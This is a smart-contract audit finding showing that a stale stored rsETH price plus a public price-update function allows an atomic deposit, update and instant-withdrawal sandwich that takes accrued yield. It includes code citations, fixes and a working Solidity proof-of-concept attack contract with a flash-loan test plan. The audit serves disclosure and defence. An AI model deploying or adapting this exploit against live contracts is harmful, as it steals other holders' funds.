Audit Report

## Title
Stale `rsETHPrice` Enables Oracle Sandwich Attack via Deposit + Instant Withdrawal - (File: `contracts/LRTDepositPool.sol` / `contracts/LRTOracle.sol` / `contracts/LRTWithdrawalManager.sol`)

## Summary

`LRTOracle.rsETHPrice` is a stored value updated only when `updateRSETHPrice()` is explicitly called. As staking rewards accrue, the stored price becomes stale (lower than the true value). An unprivileged attacker can atomically deposit at the stale low price to receive excess rsETH, call the public `updateRSETHPrice()` to push the price upward, and then call `instantWithdrawal()` to redeem at the newly updated higher price — extracting accrued yield from all other rsETH holders in a single transaction.

## Finding Description

**Root cause — stale price in deposit minting:**

`LRTDepositPool.getRsETHAmountToMint()` computes rsETH to mint as:

```solidity
rsethAmountToMint = (amount * lrtOracle.getAssetPrice(asset)) / lrtOracle.rsETHPrice();
``` [1](#0-0) 

`lrtOracle.getAssetPrice(asset)` is a live Chainlink read, but `lrtOracle.rsETHPrice()` is the **stored** value refreshed only when `updateRSETHPrice()` is called. As EigenLayer staking rewards accrue, the true per-share value of rsETH rises while `rsETHPrice` remains frozen at the old lower value, causing depositors to receive more rsETH than their deposit is worth.

**`updateRSETHPrice()` is public and callable by anyone:**

```solidity
function updateRSETHPrice() public whenNotPaused {
    _updateRsETHPrice();
}
``` [2](#0-1) 

There is no access control, no per-block guard, and no lock preventing it from being called in the same transaction as a deposit or withdrawal.

**`pricePercentageLimit` is a partial but insufficient guard:**

Inside `_updateRsETHPrice()`, if the new price exceeds `highestRsethPrice` by more than `pricePercentageLimit`, a non-manager caller reverts with `PriceAboveDailyThreshold`. However, this only blocks abnormally large single-call price jumps. For normal reward-accrual-sized price moves (e.g., a few basis points per day), the check passes and the public caller succeeds. Additionally, if `pricePercentageLimit` is 0 (unset), there is no limit at all. [3](#0-2) 

**`instantWithdrawal()` redeems at the current (post-update) `rsETHPrice`:**

`getExpectedAssetAmount()` reads `lrtOracle.rsETHPrice()` at call time:

```solidity
underlyingToReceive = amount * lrtOracle.rsETHPrice() / lrtOracle.getAssetPrice(asset);
``` [4](#0-3) 

This is called directly inside `instantWithdrawal()`: [5](#0-4) 

Because `instantWithdrawal` reads the price at execution time, calling it after `updateRSETHPrice()` uses the freshly updated (higher) price.

**The three-step atomic sandwich:**

| Step | Action | Price used |
|------|--------|-----------|
| 1 | `depositETH(minRSETH, "")` | stale low `rsETHPrice` → excess rsETH minted |
| 2 | `updateRSETHPrice()` | price rises to reflect accrued rewards |
| 3 | `instantWithdrawal(asset, rsETH, "")` | new high `rsETHPrice` → excess assets returned |

All three calls can be bundled in a single contract transaction. Flash loans can amplify step 1 to maximise the spread.

**Numerical example:**

- Protocol holds 1,100 ETH of assets, 1,000 rsETH outstanding.
- Stored `rsETHPrice` = 1.00 (stale); true price = 1.10.
- Attacker deposits 100 ETH → minted rsETH = 100 / 1.00 = **100 rsETH** (fair = 90.9).
- `updateRSETHPrice()` → new price = 1,200 / 1,100 ≈ **1.0909**.
- `instantWithdrawal(100 rsETH)` → returned ETH = 100 × 1.0909 = **109.09 ETH**.
- **Profit ≈ 9.09 ETH** (minus `instantWithdrawalFee`), extracted from existing holders.

## Impact Explanation

**High — Theft of unclaimed yield.**

The profit is extracted directly from the accrued-but-not-yet-reflected staking rewards that belong to existing rsETH holders. Each successful sandwich reduces the `rsETHPrice` that would otherwise have been distributed to long-term holders. With a flash loan the attack can be scaled to the full liquidity available in the unstaking vault, draining an entire reward epoch in one transaction.

## Likelihood Explanation

**Medium.**

- `rsETHPrice` drifts stale continuously as EigenLayer rewards accrue; no special condition is required.
- `updateRSETHPrice()` is unrestricted and callable by anyone.
- The only hard gate is `onlyInstantWithdrawalAllowed(asset)` — if instant withdrawal is disabled for all assets the atomic form is blocked. However, instant withdrawal is a core protocol feature and expected to be enabled.
- The `pricePercentageLimit` check limits the maximum single-call price jump for non-managers, but does not prevent the attack for normal reward-accrual-sized price moves, and is entirely absent if set to 0.
- The `instantWithdrawalFee` reduces but does not eliminate profit.

## Recommendation

1. **Update `rsETHPrice` atomically inside every deposit and withdrawal.** Call `_updateRsETHPrice()` at the start of `depositETH`, `depositAsset`, `initiateWithdrawal`, and `instantWithdrawal`, so the price used for minting/redeeming is always fresh.

2. **Alternatively, compute rsETH amounts on-the-fly** from `_getTotalEthInProtocol() / totalSupply()` rather than from the cached `rsETHPrice`, eliminating the staleness window entirely.

3. **Add a per-block update guard** so that `rsETHPrice` can only be updated once per block, preventing the deposit → update → withdraw sequence from being executed atomically.

## Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

interface IDepositPool {
    function depositETH(uint256 minRSETH, string calldata ref) external payable;
}
interface IOracle {
    function updateRSETHPrice() external;
}
interface IWithdrawalManager {
    function instantWithdrawal(address asset, uint256 rsETHUnstaked, string calldata ref) external;
}
interface IERC20 {
    function approve(address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}

contract OracleSandwichPoC {
    address constant ETH_ID = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    IDepositPool  pool;
    IOracle       oracle;
    IWithdrawalManager wm;
    IERC20        rsETH;

    constructor(address _pool, address _oracle, address _wm, address _rsETH) {
        pool   = IDepositPool(_pool);
        oracle = IOracle(_oracle);
        wm     = IWithdrawalManager(_wm);
        rsETH  = IERC20(_rsETH);
    }

    function attack() external payable {
        // Step 1: deposit at stale (low) rsETHPrice
        pool.depositETH{value: msg.value}(0, "");

        // Step 2: push rsETHPrice up to reflect accrued rewards
        oracle.updateRSETHPrice();

        // Step 3: instant-redeem at new (high) rsETHPrice
        uint256 rsETHBal = rsETH.balanceOf(address(this));
        rsETH.approve(address(wm), rsETHBal);
        wm.instantWithdrawal(ETH_ID, rsETHBal, "");

        // Profit = address(this).balance - msg.value (minus fee)
    }

    receive() external payable {}
}
```

**Foundry fork test plan:** Fork mainnet, seed the protocol with accrued rewards (advance time without calling `updateRSETHPrice`), deploy `OracleSandwichPoC`, call `attack()` with a flash-loaned ETH amount, and assert `address(attacker).balance > initialBalance` after repaying the flash loan. Confirm that existing rsETH holders' redeemable value decreased by the attacker's profit.

### Citations

**File:** contracts/LRTDepositPool.sol (L519-521)
```text
        // calculate rseth amount to mint based on asset amount and asset exchange rate
        rsethAmountToMint = (amount * lrtOracle.getAssetPrice(asset)) / lrtOracle.rsETHPrice();
    }
```

**File:** contracts/LRTOracle.sol (L87-89)
```text
    function updateRSETHPrice() public whenNotPaused {
        _updateRsETHPrice();
    }
```

**File:** contracts/LRTOracle.sol (L252-266)
```text
        if (newRsETHPrice > highestRsethPrice) {
            // check if the price is above the threshold
            uint256 priceDifference = newRsETHPrice - highestRsethPrice;
            // pricePercentageLimit is in 1e18 precision (100% = 1e18, 1% = 1e16)
            bool isPriceIncreaseOffLimit =
                pricePercentageLimit > 0 && priceDifference > pricePercentageLimit.mulWad(highestRsethPrice);

            // check if the price difference is above the threshold
            if (isPriceIncreaseOffLimit) {
                // if sender has a manager role, this doesn't revert.
                // if not, it reverts as price went above the threshold
                if (!IAccessControl(address(lrtConfig)).hasRole(LRTConstants.MANAGER, msg.sender)) {
                    revert PriceAboveDailyThreshold();
                }
            }
```

**File:** contracts/LRTWithdrawalManager.sol (L228-229)
```text
        uint256 assetAmountUnlocked = getExpectedAssetAmount(asset, rsETHUnstaked);
        IRSETH(lrtConfig.rsETH()).burnFrom(address(msg.sender), rsETHUnstaked);
```

**File:** contracts/LRTWithdrawalManager.sol (L590-594)
```text
        ILRTOracle lrtOracle = ILRTOracle(lrtConfig.getContract(LRTConstants.LRT_ORACLE));

        // calculate underlying asset amount to receive based on rsETH amount and asset exchange rate
        underlyingToReceive = amount * lrtOracle.rsETHPrice() / lrtOracle.getAssetPrice(asset);
    }
```
